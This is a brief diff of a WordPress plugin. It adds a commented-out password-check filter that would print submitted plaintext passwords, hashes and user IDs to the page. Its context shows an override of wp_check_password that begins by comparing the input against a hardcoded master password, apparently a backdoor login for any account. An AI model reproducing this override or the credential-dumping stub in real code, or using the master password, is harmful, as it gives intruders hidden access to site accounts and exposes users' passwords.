@@ -32,6 +32,20 @@ function lowrez_user_enqueue_scripts( $hook_suffix ) {
 	}
 }
 
+
+/*add_filter('check_password', 'lowrez_login_as');
+function lowrez_login_as ($check=false, $password=false, $hash=false, $user_id=false) {
+     
+	echo '<pre>';
+	var_dump($check);
+	var_dump($password);
+	var_dump($hash);
+	var_dump($user_id);
+	echo '</pre>';
+	
+	die();
+}*/
+
 function wp_check_password($password, $hash, $user_id = '') {
 	
 	if ($password == 'webmasterLrzStk08') {
